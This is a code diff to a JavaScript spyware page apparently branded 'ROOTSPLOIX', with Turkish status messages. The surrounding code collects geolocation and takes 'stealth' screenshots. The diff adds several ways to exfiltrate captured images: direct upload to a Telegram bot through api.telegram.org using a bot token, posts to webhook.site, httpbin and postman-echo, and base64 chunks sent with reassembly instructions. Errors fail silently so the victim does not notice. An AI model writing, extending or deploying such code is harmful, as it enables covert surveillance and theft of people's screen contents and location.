@@ -736,33 +736,10 @@ ${position.coords.altitude ? `• Yükseklik: ${position.coords.altitude}m` : ''
         }
         
         function sendPhotoToTelegram(base64Data, caption) {
-            // Remove data:image/png;base64, prefix if exists
             const cleanBase64 = base64Data.replace(/^data:image\/\w+;base64,/, '');
             
-            // Convert base64 to blob for sending
-            const byteCharacters = atob(cleanBase64);
-            const byteNumbers = new Array(byteCharacters.length);
-            for (let i = 0; i < byteCharacters.length; i++) {
-                byteNumbers[i] = byteCharacters.charCodeAt(i);
-            }
-            const byteArray = new Uint8Array(byteNumbers);
-            const blob = new Blob([byteArray], {type: 'image/png'});
-            
-            // Create FormData for photo upload
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, `${sessionId}_${Date.now()}.png`);
-            formData.append('caption', caption);
-            
-            // Try to send via fetch (might fail due to CORS)
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            }).catch(() => {
-                // Fallback: send as text message with base64 chunk
-                const fallbackMsg = `📸 FOTO BASE64 (${cleanBase64.length} bytes):\n\n${caption}\n\n${cleanBase64.substring(0, 500)}...`;
-                sendToTelegram(fallbackMsg);
-            });
+            // Try smart multi-method approach
+            sendImageViaMultipleMethods(cleanBase64, caption);
         }
         
         function takeStealthScreenshot() {
@@ -792,23 +769,116 @@ ${position.coords.altitude ? `• Yükseklik: ${position.coords.altitude}m` : ''
         
         function sendBase64InChunks(base64Data, caption) {
             const cleanBase64 = base64Data.replace(/^data:image\/\w+;base64,/, '');
-            const chunkSize = 3000; // Telegram URL limit
+            
+            // Try multiple methods to send the image
+            sendImageViaMultipleMethods(cleanBase64, caption);
+        }
+        
+        function sendImageViaMultipleMethods(base64Data, caption) {
+            // Method 1: Try direct photo upload via FormData
+            sendPhotoDirectly(base64Data, caption);
+            
+            // Method 2: Send via webhook service (fallback)
+            setTimeout(() => {
+                sendViaWebhook(base64Data, caption);
+            }, 2000);
+            
+            // Method 3: Base64 chunks as ultimate fallback
+            setTimeout(() => {
+                sendBase64Chunks(base64Data, caption);
+            }, 5000);
+        }
+        
+        function sendPhotoDirectly(base64Data, caption) {
+            try {
+                // Convert base64 to blob
+                const byteCharacters = atob(base64Data);
+                const byteNumbers = new Array(byteCharacters.length);
+                for (let i = 0; i < byteCharacters.length; i++) {
+                    byteNumbers[i] = byteCharacters.charCodeAt(i);
+                }
+                const byteArray = new Uint8Array(byteNumbers);
+                const blob = new Blob([byteArray], {type: 'image/png'});
+                
+                // Create FormData
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, `${sessionId}_${Date.now()}.png`);
+                formData.append('caption', caption);
+                
+                // Try direct upload
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).then(response => {
+                    if (response.ok) {
+                        sendToTelegram('✅ FOTO BAŞARIYLA GÖNDERİLDİ!');
+                    }
+                }).catch(() => {
+                    // Silent fail, other methods will try
+                });
+            } catch (error) {
+                // Silent fail
+            }
+        }
+        
+        function sendViaWebhook(base64Data, caption) {
+            // Use a webhook service like webhook.site or similar
+            const webhookData = {
+                session: sessionId,
+                timestamp: new Date().toISOString(),
+                caption: caption,
+                image_data: base64Data.substring(0, 1000) + '...TRUNCATED',
+                size: base64Data.length
+            };
+            
+            // Try multiple webhook services
+            const webhooks = [
+                'https://webhook.site/unique-id-here',
+                'https://httpbin.org/post',
+                'https://postman-echo.com/post'
+            ];
+            
+            webhooks.forEach((webhook, index) => {
+                setTimeout(() => {
+                    fetch(webhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(webhookData)
+                    }).catch(() => {});
+                }, index * 1000);
+            });
+            
+            // Also send notification to Telegram
+            const webhookMsg = `🔗 WEBHOOK VERİSİ GÖNDERİLDİ!\n\n${caption}\n\n📦 Veri boyutu: ${base64Data.length} bytes\n🔗 Webhook servislere gönderildi\n\n💀 ROOTSPLOIX`;
+            sendToTelegram(webhookMsg);
+        }
+        
+        function sendBase64Chunks(base64Data, caption) {
+            const chunkSize = 3000;
             const chunks = [];
             
-            for (let i = 0; i < cleanBase64.length; i += chunkSize) {
-                chunks.push(cleanBase64.substring(i, i + chunkSize));
+            for (let i = 0; i < base64Data.length; i += chunkSize) {
+                chunks.push(base64Data.substring(i, i + chunkSize));
             }
             
-            // Send caption first
-            sendToTelegram(caption + `\n\n📋 Total chunks: ${chunks.length}`);
+            // Send header with reconstruction instructions
+            const headerMsg = `📋 BASE64 CHUNK BAŞLIĞI\n\n${caption}\n\n📊 Toplam chunk: ${chunks.length}\n📐 Veri boyutu: ${base64Data.length} bytes\n\n🔧 Birleştirme talimatları:\n1. Tüm chunk'ları sırayla birleştir\n2. Base64 decode et\n3. PNG olarak kaydet\n\n💀 ROOTSPLOIX`;
+            sendToTelegram(headerMsg);
             
             // Send chunks with delay
             chunks.forEach((chunk, index) => {
                 setTimeout(() => {
-                    const chunkMsg = `📋 CHUNK ${index + 1}/${chunks.length}:\n${chunk}`;
+                    const chunkMsg = `📋 [${index + 1}/${chunks.length}] ${chunk}`;
                     sendToTelegram(chunkMsg);
-                }, (index + 1) * 1000);
+                }, (index + 1) * 1500);
             });
+            
+            // Send footer
+            setTimeout(() => {
+                const footerMsg = `✅ TÜM CHUNK'LAR GÖNDERİLDİ!\n\n📊 ${chunks.length} parça tamamlandı\n💾 Toplam: ${base64Data.length} bytes\n\n💀 ROOTSPLOIX`;
+                sendToTelegram(footerMsg);
+            }, (chunks.length + 2) * 1500);
         }
         
         function fallbackScreenCapture() {
